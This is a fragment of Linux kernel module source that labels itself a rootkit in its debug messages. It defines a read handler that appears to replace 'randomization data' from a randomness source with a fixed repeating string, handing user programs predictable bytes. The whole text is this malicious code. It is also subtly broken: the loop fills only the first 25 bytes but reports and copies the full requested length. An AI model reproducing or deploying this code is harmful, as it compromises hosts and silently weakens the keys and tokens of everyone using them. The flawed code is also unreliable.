#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/version.h>

//Switching containing data for randomization
ssize_t buffer_switching(struct file *file, char __user *buf, size_t nbytes,
			 loff_t *ppos)
{
	unsigned long err = 0;
	size_t i;
	char *my_buff = kzalloc(nbytes, GFP_KERNEL);
	
	const char own_buf[] = "n38djejn8f3rna34xt5409da3";
	const size_t size = sizeof(own_buf)-1;
	
	if (my_buff == NULL) {
		printk(KERN_DEBUG "rootkit: kzalloc failure\n");
		return 0;
	}

	for(i = 0; i < size; ++i)
		my_buff[i] = own_buf[i%size];

	//copying own data to userspace buffer which cointains randomization data
	err = copy_to_user(buf, my_buff, nbytes);
	if (err)
		printk(KERN_DEBUG "rootkit: %ld bytes wasn't copied\n", err);

	kfree(my_buff);
	return (ssize_t)nbytes;
}
